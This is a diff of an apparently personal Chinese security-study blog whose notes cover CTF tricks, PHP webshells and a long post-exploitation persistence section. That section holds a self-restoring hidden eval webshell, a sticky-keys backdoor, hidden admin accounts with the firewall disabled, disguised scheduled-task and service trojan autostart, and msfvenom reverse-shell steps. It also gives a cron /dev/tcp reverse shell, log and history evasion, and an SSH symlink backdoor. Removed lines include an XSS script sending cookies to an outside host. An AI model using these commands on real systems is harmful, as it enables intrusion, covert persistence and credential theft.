+<p><strong>二次注入</strong></p>
+<p>网页输入的a进行了限制，可以选择二次注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=eval($_GET[a]);&amp;a=system(&quot;tac flag.p?p&quot;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="Windows命令连接符"><a href="#Windows命令连接符" class="headerlink" title="Windows命令连接符"></a><strong>Windows命令连接符</strong></h4><p>“&amp;”命令前面的语句为假，则直接执行后面的;前面的语句为真，命令都执行。</p>
 <p>“&amp;&amp;”前面的语句为假，则直接出错，后面的也不执行;前面为真，都执行。</p>
 <p>“|”前面命令正确，直接执行后面的语句;前面的语句为假，则直接出错，后面的也不执行。</p>
 <p>“||”前面出错，执行后面的;前面不出错，不会只执行前面的，不执行后面的命令。</p>
-<p>Linux下的命令连接符包括“;”、“&amp;”、“&amp;&amp;”、“I”、“Il”。</p>
+<p><strong>Linux下的命令连接符</strong>包括“;”、“&amp;”、“&amp;&amp;”、“I”、“Il”。</p>
 <p>“:”分号操作符使多个命令顺序执行，前面命令和后面命令的都会执行。</p>
 <p>“&amp;”和号操作符,作用是使命令在后台运行,这样就可以同时执行多条命令。</p>
 <p>“&amp;&amp;”与操作符,第一个命令执行成功，执行第二个命令。</p>
 <p>“|”管道操作符，将第一个命令的输出作为第二个命令的输入，前面跟后面的都会执行，但是只显示后面的执行结果。</p>
 <p>“||”或操作符，类似于编程中的 if else语句。前面的命令执行成功后面的命令不会执行，前面的命令执行失败后面的命令会执行。</p>
-<p>ctrl + u</p>
-<p>view-source:</p>
+<h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h4><p>cat:由第一行开始显示内容，并将所有内容输出<br>tac:从最后一行倒序显示内容，并将所有内容输出<br>more:根据窗口大小，一页一页的现实文件内容<br>less:和more类似，但其优点可以往前翻页，而且进行可以搜索字符<br>head:只显示头几行<br>tail:只显示最后几行<br>nl:类似于cat -n，显示时输出行号<br>tailf:类似于tail -f<br>sort%20&#x2F;flag 读文件<br>dir来查看当前目录文件</p>
+<p>ctrl + u（强制打开浏览器控制台）</p>
+<p>view-source:（放在网站开头，打开网页源码）</p>
 <p>看源码</p>
 <p>看UA头</p>
 <p>看robots.txt(机器人文件。)</p>
 <p>看index.phps(下载)</p>
 <p>kali目录扫描dirsearch -r: <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
 <p>swp数据交换文件</p>
+<p>cookie</p>
+<p>kali中nslookup查看dns域名解析。</p>
+<p>源码泄露重要(editor)信息，上传文件空间查看var-&gt;www-&gt;html-&gt;nothinghere</p>
+<p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
+<p>探针泄露，网站&#x2F;tz.php,点phpinfo，找ctf</p>
+<p>数据库泄露,sql备份，backup.</p>
+<h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>eval（）和assert（）函数导致的代码执行漏洞大多是因为载入缓存或者模板以及对变量的处理不严格导致，比如直接把一个外部可控的参数拼接到模板里面，然后调用这两个函数去当成PHP代码执行。</p>
+<p>preg_replace（）函数的代码执行需要存在&#x2F;e参数，这个函数原本是用来处理字符串的，因此漏洞出现最多的是在对字符串的处理，比如URL、HTML标签以及文章内容等过滤功能。</p>
+<p>call_user_func（）和call_user_func_array（）函数的功能是调用函数，多用在框架里面动态调用函数，所以一般比较小的程序出现这种方式的代码执行会比较少。array_map（）函数的作用是调用函数并且除第一个参数外其他参数为数组，通常会写死第一个参数，即调用的函数。</p>
+<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>eval      <code>&lt;?php @eval($_POST[cmd])?&gt;</code></p>
+<p>assert  <code>&lt;?php @assert($_POST[cmd])?&gt;</code></p>
+<p>call_user_func()  <code>&lt;call_user_func($_POST[&#39;fun&#39;],$_POST[&#39;arg&#39;])&gt;</code></p>
+<p>call_user_func_array()  <code>&lt;?php call_user_func_array($_POST[&#39;fun&#39;], $_POST[&#39;arg&#39;]);?&gt;</code></p>
+<p>create_function()  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$code = &#x27;echo&#x27;.$func.&#x27;test&#x27;.$id.&#x27;;&#x27;;</span><br><span class="line">creat_function(&#x27;$func&#x27;,$code)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>array_map()</p>
+<p>preg_replace()</p>
+<h4 id="加密，密码学"><a href="#加密，密码学" class="headerlink" title="加密，密码学"></a>加密，密码学</h4><p>机密性</p>
+<p>完整性</p>
+<p>可用性</p>
+<p>认证性</p>
+<p>不可否认性</p>
+<p><strong>凯撒密码：</strong></p>
+<p>偏移编码，一般是4位或13位</p>
+<p><strong>Base家族：</strong></p>
+<p>base16、64、58、62、85、91、92、100</p>
+<p>Unicode编码：</p>
+<p>中文编码</p>
+<p><strong>URL编码：</strong></p>
+<p>XXEncode:</p>
+<p>花朵编码：，音符编码：，文言文编码：</p>
+<p><strong>猪圈密码：</strong></p>
+<p>ROTN：</p>
+<p>ROT5&#x2F;13&#x2F;18&#x2F;47(偏移编码)</p>
+<p><strong>佛曰加密：</strong></p>
+<p>盲文编码：</p>
+<p>培根密码：</p>
+<p>三分密码：</p>
+<p><strong>栅栏密码：</strong></p>
+<p>jsfuck编码：</p>
+<p>摩斯密码：</p>
+<p>phpfuck：</p>
+<h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(); //关掉浏览器，PHP脚本也可以继续执行.</span><br><span class="line">set_time_limit(0);//通过set_time_limit(0)可以让程序无限制的执行下去</span><br><span class="line">$interval = 5; // 每隔*秒运行</span><br><span class="line">do &#123;</span><br><span class="line">$filename = &#x27;test.php&#x27;;</span><br><span class="line">if(file_exists($filename)) &#123;</span><br><span class="line">echo &quot;xxx&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">$file = fopen(&quot;test.php&quot;, &quot;w&quot;);</span><br><span class="line">$txt = &quot;&lt;?php @eval($_POST[cmd]); ?&gt;\n&quot;;   //木马密码cmd</span><br><span class="line">fwrite($file, $txt);</span><br><span class="line">fclose($file);</span><br><span class="line">eval(system(&quot;Attrib +s +a +h +r test.php&quot;)); //隐藏文件</span><br><span class="line">&#125;</span><br><span class="line">sleep($interval);</span><br><span class="line">&#125; while (true);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="锁屏下开命令行"><a href="#锁屏下开命令行" class="headerlink" title="锁屏下开命令行"></a>锁屏下开命令行</h4><p>命令行下输入下面语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move C:\windows\system32\sethc.exe C:\windows\system32\sethc.exe.bak</span><br><span class="line"></span><br><span class="line">Copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe</span><br></pre></td></tr></table></figure>
+
+<p>如果报错或其他原因，可以去手动更改。</p>
+<p>搜索C:\Windows\System32文件夹里的sethc.exe文件。右键打开文件路径。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121204650077.png" alt="image-20240121204650077"></p>
+<p>返回上一级目录，右键System32文件夹，点击属性&#x3D;》安全&#x3D;》高级&#x3D;》更改&#x3D;》高级。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205120830.png" alt="image-20240121205120830"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205213425.png" alt="image-20240121205213425"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205301672.png" alt="image-20240121205301672"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205340869.png" alt="image-20240121205340869"></p>
+<p>点击立即查找&#x3D;》选着Everyone&#x3D;》点击确定。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205846981.png" alt="image-20240121205846981"></p>
+<p>勾选如图两个内容，点击确定。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121205652850.png" alt="image-20240121205652850"></p>
+<p>进入System32将文件sethc.exe改为sethc.exe1</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121210215246.png" alt="image-20240121210215246"></p>
+<p>搜索cmd.exe,打开路径。</p>
+<p>将其复制并改名为setch.exe</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121210539449.png" alt="image-20240121210539449"></p>
+<p>win+L    息屏</p>
+<p>连续按五次shift即可打开命令行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240121210737866.png" alt="image-20240121210737866"></p>
+<p>net user qianxin QanXin.Nb123 &#x2F;add<br>net localgroup administrators qianxin &#x2F;add<br>netsh firewall set opmode disable<br>netsh advfirewall show allprofiles<br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br>netstat -anop tcp | find “3389”</p>
+<h5 id="创建我的电脑"><a href="#创建我的电脑" class="headerlink" title="创建我的电脑"></a>创建我的电脑</h5><p>创建文件夹，将文件夹名改为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我的电脑.&#123;20D04FE0-3AEA-1069-A2D8-08002B30309D&#125;    </span><br><span class="line">回收站.&#123;645ff040-5081-101b-9f08-00aa002f954e&#125; </span><br><span class="line">拔号⽹络.&#123;992CFFA0-F557-101A-88EC-00DD010CCC48&#125; </span><br><span class="line">打印机.&#123;2227a280-3aea-1069-a2de-08002b30309d&#125; </span><br><span class="line">控制⾯板.&#123;21ec2020-3aea-1069-a2dd-08002b30309d&#125; </span><br><span class="line">⽹上邻居.&#123;208D2C60-3AEA-1069-A2D7-08002B30309D&#125;  </span><br></pre></td></tr></table></figure>
+
+<h4 id="创建不可删除文件"><a href="#创建不可删除文件" class="headerlink" title="创建不可删除文件"></a>创建不可删除文件</h4><h5 id="文件夹"><a href="#文件夹" class="headerlink" title="文件夹"></a>文件夹</h5><p>创建文件夹夹(创建的文件夹很难删除)，在c盘的用户的Administrator中创建a…文件夹。可以放到网站根目录下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md a...\</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122151802764.png" alt="image-20240122151802764"></p>
+<p>可以将文件copy到文件a…文件夹中。</p>
+<p>删除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rd /s /q a...\</span><br></pre></td></tr></table></figure>
+
+<h5 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h5><p>Windows 下不能够以下⾯这些字样来命名⽂件&#x2F;⽂件夹，包括：aux，com1，com2，prn，con和nul等，但 是通过cmd下是可以创建此类⽂件夹的，使⽤copy命令即可实现 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.php  \\.\D:\desk\www\aux.php</span><br></pre></td></tr></table></figure>
+
+<p>查看文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type \\.\C:\phpstudy_pro\WWW\wo\aux.php</span><br></pre></td></tr></table></figure>
+
+<p>删除文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del \\.\C:\phpstudy_pro\WWW\wo\aux.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>在计划任务\Microsoft\WindowsUpdate\Tasks\Secute\Update有一个触发器。可以用其自动启用木马。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123102339349.png" alt="image-20240123102339349"></p>
+<p>设置一个触发器使其每一分钟就触发一次木马。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn &quot;\Microsoft\WindowsUpdate\Tasks\Secute\Update\Run&quot; /tr &quot;C:\Users\Administrator\Desktop\Server.exe&quot; /rl highest /F /sc minute /mo 1  /RU system</span><br></pre></td></tr></table></figure>
+
+<p>可以在任务管理器中找到木马，结束任务。发现在一分钟后又会自启动。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123103914650.png" alt="image-20240123103914650"></p>
+<p>可以在任务计划里右键将其删除。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123104023435.png" alt="image-20240123104023435"></p>
+<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>设置开机自启。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create &quot;.NET CLR Networking 3.5.0.0&quot; binpath= &quot;cmd.exe /k C:\Users\Administrator\Desktop\Server.exe&quot; depend= Tcpip obj= Localsystem start= auto</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123110118811.png" alt="image-20240123110118811"></p>
+<p>查询</p>
+<p>可以在任务管理器的服务中找到.NET CLR Networking 3.5.0.0</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123110650724.png" alt="image-20240123110650724"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc   //查看sc命令</span><br><span class="line">sc query &quot;.NET CLR Networking 3.5.0.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p>删除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete &quot;.NET CLR Networking 3.5.0.0&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123110746474.png" alt="image-20240123110746474"></p>
+<h5 id="将生成的服务更难删除"><a href="#将生成的服务更难删除" class="headerlink" title="将生成的服务更难删除"></a>将生成的服务更难删除</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc sdset &quot;.NET CLR Networking 3.5.0.0&quot; &quot;D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>永恒账户</p>
+<p>注册表</p>
+<p>计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\qianxin$</p>
+<h3 id="kali命令执行"><a href="#kali命令执行" class="headerlink" title="kali命令执行"></a>kali命令执行</h3><h4 id="kali写码"><a href="#kali写码" class="headerlink" title="kali写码"></a>kali写码</h4><p>进入msfconsole集中控制台。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122191100724.png" alt="image-20240122191100724"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122192311431.png" alt="image-20240122192311431"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122192531468.png" alt="image-20240122192531468"></p>
+<p>yes代表哪一行是必填的，要在lhost中填入kali的ip地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ifconfig  //查ip地址</span><br><span class="line">set lhost 192.168.2.77</span><br><span class="line">show options //查看是否改完</span><br><span class="line">run  //运行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122193140128.png" alt="image-20240122193140128"></p>
+<h4 id="生成码"><a href="#生成码" class="headerlink" title="生成码"></a>生成码</h4><p>在另一个页面输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p //查看msfvenom怎么用</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.2.59 lport=4444 -f exe -o 1.exe  //生成一个名为1.php的码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122193719290.png" alt="image-20240122193719290"></p>
+<p>将生成的码移到win10虚拟机中，双击运行。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122195333336.png" alt="image-20240122195333336"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">whoami</span><br><span class="line">help</span><br><span class="line">shell</span><br><span class="line">chcp 65001   //转换成中文</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">//explorer.exe是系统一定有的文件，启动桌面</span><br><span class="line">migrate 8644 //隐藏1.txt码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240122200649909.png" alt="image-20240122200649909"></p>
+<p>shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -c &#x27;/bin/sh -i &gt;&amp;/dev/tcp/192.168.2.77/4444 0&gt;&amp;1&#x27;;\r%100c\n</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+
+
+
+<p>要修改时间，要将该文件的所有父目录都需改。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch -r 源文件名 新文件名</span><br></pre></td></tr></table></figure>
+
+<p>文件上锁</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chattr +i 1.txt  //加锁</span><br><span class="line">chattr -i 1.txt  //解锁</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123144620155.png" alt="image-20240123144620155"></p>
+<p>不记录历史记录操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .zsh_history   //.zsh_history是一个记录历史命令的文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123145158614.png" alt="image-20240123145158614"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set +o history  //开头带一个空格的将不会被记录</span><br><span class="line">set -o history</span><br><span class="line">history -d 220(set +o history语句所在的行数)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123145958114.png" alt="image-20240123145958114"></p>
+<p>使用文件创建用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/passwd</span><br><span class="line">在后面添加qing:x:1001:1001::/qing:/bin/bash</span><br><span class="line">vim /etc/shadow</span><br><span class="line">在后面添加qing:$1$g2KIWGC6$9xDPCB2Ok9D4MCaVbju2s.（密码）:19421:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd 密码</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123153222315.png" alt="image-20240123153222315"></p>
+<p>可以用su进行登入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su qing</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240123153301498.png" alt="image-20240123153301498"></p>
+<h4 id="ssh软连接后门"><a href="#ssh软连接后门" class="headerlink" title="ssh软连接后门"></a>ssh软连接后门</h4><p>关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop firewalld</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oPort=1234 </span><br><span class="line">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=12345</span><br><span class="line">ssh root@192.168.1.148 -p12345</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -464,929 +1483,10 @@
 
 
   
-    <article id="post-xss漏洞" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2024/01/16/xss%E6%BC%8F%E6%B4%9E/" class="article-date">
-  <time class="post-time" datetime="2024-01-16T06:52:44.000Z" itemprop="datePublished">
-    <span class="post-month">1月</span><br/>
-    <span class="post-day">16</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/01/16/xss%E6%BC%8F%E6%B4%9E/">xss漏洞</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a target="_blank" rel="noopener" href="http://192.168.2.103/DVWA-master/DVWA-master/vulnerabilities/xss_r/?name=root#">http://192.168.2.103/DVWA-master/DVWA-master/vulnerabilities/xss_r/?name=root#</a></p>
-<script>document.location='http://192.168.2.66/cookie.php?cookie='+document.cookie</script>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="pikachu中XSS漏洞"><a href="#pikachu中XSS漏洞" class="headerlink" title="pikachu中XSS漏洞"></a>pikachu中XSS漏洞</h3><h4 id="一、反射性XSS（get）"><a href="#一、反射性XSS（get）" class="headerlink" title="一、反射性XSS（get）"></a>一、反射性XSS（get）</h4><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117104554284.png" alt="image-20240117104554284"></p>
-<p>首先确认页面是否存在xss漏洞，我们输入一些特殊的字符，””&lt;&gt;111，点击提交，看是否被过滤掉了，看返回图：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117104721692.png" alt="image-20240117104721692"></p>
-<p>发现没有过滤，所以我们简单的输入一个JS，按我们的猜想，它是能弹窗的。</p>
-<p>因为限制了长度，需要更改。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117104955818.png" alt="image-20240117104955818"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117105047971.png" alt="image-20240117105047971"></p>
-<h4 id="二、反射性XSS（post）"><a href="#二、反射性XSS（post）" class="headerlink" title="二、反射性XSS（post）"></a>二、反射性XSS（post）</h4><p><strong>get方式的XSS漏洞更加容易利用，一般利用的方式是将带有跨站脚本的URL伪装后发给目标。而post方式是以表单方式提交的，无法直接使用URL方式来进行攻击</strong></p>
-<p>可以尝试登入进去。、</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240117142730958.png" alt="image-20240117142730958"></p>
-<h4 id="三、存储型XSS"><a href="#三、存储型XSS" class="headerlink" title="三、存储型XSS"></a>三、存储型XSS</h4><p>存储型xss漏洞跟反射型形成的原因一样，不同的是存储型xss下攻击者可以将脚本注入到后台存储起来，构成更加持久的伤害，因此存储型xss又称为“永久型”xss。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118111404167.png" alt="image-20240118111404167"></p>
-<h4 id="四、DOM型XSS"><a href="#四、DOM型XSS" class="headerlink" title="四、DOM型XSS"></a>四、DOM型XSS</h4><p>DOM是什么？<br>通过JavaScript，可以重构整个HTML文档。你可以添加、移除、改变或重新排版。要改变页面的某个东西，JavaScript就需要获得对HTML文档所有元素进行访问的入口，这个入口，连同对HTML元素进行添加、移动、改变或移除的方法和属性，都是通过文档对象模型来获得的（DOM）</p>
-<p><strong>所以，你可以把DOM理解为一个一个访问HTML的标准编程接口。</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118111902086.png" alt="image-20240118111902086"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118111914212.png" alt="image-20240118111914212"></p>
-<p><strong>这里，我们知道 输入的字符串通过DOM的方式拼接到了a的标签中</strong></p>
-<p>将其闭合,点击下方按钮。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick = &#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118112112536.png" alt="image-20240118112112536"></p>
-<h4 id="五、DOM型XSS-X"><a href="#五、DOM型XSS-X" class="headerlink" title="五、DOM型XSS-X"></a>五、DOM型XSS-X</h4><p>一样是闭合</p>
-<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20240118112339721.png" alt="image-20240118112339721"></p>
-<p>这个输入是从浏览器的URL中获取的，形成漏洞的输入点是在URL的参数中。</p>
